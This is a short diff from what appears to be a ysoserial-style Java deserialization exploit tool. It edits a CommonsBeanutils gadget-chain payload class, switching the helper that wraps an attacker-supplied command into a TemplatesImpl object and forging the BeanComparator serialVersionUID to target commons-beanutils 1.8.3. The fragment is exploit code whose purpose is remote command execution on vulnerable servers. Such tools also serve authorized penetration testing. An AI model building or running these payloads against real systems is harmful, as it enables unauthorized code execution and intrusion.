@@ -17,7 +17,7 @@ public class CommonsBeanutils1183NOCC implements CommandObjectPayload<Object>
 
 	@Override
 	public Object getObject(String command) throws Exception {
-		final Object template = Gadgets.createTemplatesImpl(command);
+		final Object template = Gadgets.createTemplates4Cmd(command);
 
 		CtClass ctClass = Config.POOL.get("org.apache.commons.beanutils.BeanComparator");
 		CtClassUtils.insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
